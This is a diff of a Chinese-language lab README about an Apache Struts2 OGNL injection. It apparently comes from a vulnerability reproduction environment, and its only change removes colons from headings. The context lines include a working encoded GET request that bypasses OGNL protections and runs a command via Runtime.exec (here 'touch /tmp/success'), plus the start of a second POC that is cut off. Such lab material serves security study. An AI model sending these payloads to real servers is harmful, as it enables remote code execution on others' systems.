@@ -35,7 +35,7 @@ docker-compose up -d
 
 ## POC && EXP
 
-### 执行任意命令POC（无回显，空格用`@`代替）：
+### 执行任意命令POC（无回显，空格用`@`代替）
 
 ```
 GET /example/HelloWorld.action?(%27%5cu0023_memberAccess[%5c%27allowStaticMethodAccess%5c%27]%27)(vaaa)=true&(aaaa)((%27%5cu0023context[%5c%27xwork.MethodAccessor.denyMethodExecution%5c%27]%5cu003d%5cu0023vccc%27)(%5cu0023vccc%5cu003dnew%20java.lang.Boolean(%22false%22)))&(asdf)(('%5cu0023rt.exec(%22touch@/tmp/success%22.split(%22@%22))')(%5cu0023rt%5cu003d@java.lang.Runtime@getRuntime()))=1 HTTP/1.1
@@ -55,7 +55,7 @@ POC用到了OGNL的Expression Evaluation：
 
 期待大佬研究出有回显的POC。
 
-### 执行任意命令POC（有回显，将需要执行的命令进行urlencode编码）：
+### 执行任意命令POC（有回显，将需要执行的命令进行urlencode编码）
 
 ```
 POST /example/HelloWorld.action HTTP/1.1
